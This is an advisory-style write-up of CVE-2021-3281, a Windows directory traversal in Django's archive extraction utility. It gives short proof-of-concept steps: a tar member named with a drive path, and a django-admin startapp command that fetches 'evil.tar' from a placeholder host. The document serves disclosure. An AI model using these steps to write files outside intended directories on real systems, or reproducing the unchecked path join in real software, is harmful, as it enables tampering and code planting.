# CVE-2021-3281

There is a Directory Traversal vulnerability in django.utils.archive.py, lineno:171, in Class TarArchive.

The function call os.path.join(to_path, name) didn't check the param "name",if someone use this util on windows platform,there'll be a Directory Traversal risk, the POC is:

```
from django.utils import archive
archive.extract('test.tar','.')
The test.tar include file named "d:game.exe",and the poc will create a file named "game.exe" in D://game.exe rather than "."
It looks like the Django core didn't use this util,but I still think it's a risk,maybe someone will use this util in webapp to archive somethings.``and there is another scene:``"djangoadmin startapp --template" command will use archive.py,see in https://docs.djangoproject.com/en/3.1/ref/django-admin/#s-startapp. POC is:

django-admin.exe startapp vulapp --template="C:/my_templates/test.tar"
It'll create a file named "game.exe" in D://game.exe rather than "vulapp/", It also accept URLs like "django-admin.exe startapp vulapp --template=https://xxx.com/evil.tar"
```

### POC

```python
from django.utils import archive
archive.extract('test.tar','.')
```

There is same problem in Python/Lib/tarfile.py:

```python
#Lib/tarfile.py:
import tarfile
tar=tarfile.open('test.tar','r')
tar.extractall('.')
tar.close()
```

and the doc gives a warning ,see https://docs.python.org/3/library/tarfile.html#tarfile.TarFile.extractall

### Link

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3281

https://www.djangoproject.com/weblog/2021/feb/01/security-releases/